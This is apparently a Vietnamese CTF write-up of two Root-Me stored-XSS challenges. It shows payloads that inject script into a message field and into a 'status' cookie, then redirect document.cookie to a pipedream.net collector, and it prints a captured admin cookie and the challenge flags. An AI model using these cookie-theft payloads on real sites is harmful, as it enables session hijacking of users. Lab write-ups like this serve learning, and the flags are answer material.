# Trần Mạnh Huy

* [Chall 1:	XSS - Stored 1](#chall-1-xss---stored-1)
* [Chall 2: XSS - Stored 2](#chall-2-xss---stored-2)


## Chall 1: Xss - Stored 1

```
Statement
Steal the administrator session cookie and use it to validate this chall.

```

Đây là 1 chall đơn giản về stored xss. Có 2 phần nhập title và message, gửi abcd ở cả 2 rồi check source bên burpsuite.
Có vẻ tiêm được script nên test luôn: <script>alert(1)</script>, và alert được, vậy thì triển tiếp thôi.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/xss_02.jpg)


Ý tưởng là ta sẽ lưu scipt cướp cookie ở form message và ngồi đợi thằng admin đến đọc cái message đó và bay màu.

Truyền payload vào message để lấy cookie: <script>document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c=".cocat(documemt.cookie)</script>

Ở đây dùng đường dẫn trên pipedream kết hợp với concat để nối thực hiện chuỗi, được server trả về kết quả:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/xss_03.jpg)


> Flag: _ga=GA1.1.73691999.1669083110


## Chall 2: XSS - Stored 2

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_01.jpg)

Vẫn như bài trước cho ta 2 phần nhập nhưng thêm 1 số tính năng, và giờ title và message đã bị encode html enities nên kh thực hiện xss được ở đây.

Nếu để ý kĩ, mình sẽ thấy giá trị cookie status=invite đang được hiện thị trên page và không bị fitler html entities. Ta có thể tận dụng ở đây để thực hiện xss

#### Payload: Cookie: status="><script>alert(1)</script>

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_04.jpg)

Thực hiện alert thành công, tương tự như bài trước ta gửi payload:

> "><script>document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c=".concat(document.cookie)</script>

Ta nhận được cookie trả về :

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_03.jpg)

Có được cookie rồi ta ném vào ?section=admin để lấy flag

> COOKIE: status=invite;ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_04.jpg)

> FLag: E5HKEGyCXQVsYaehaqeJs0AfV
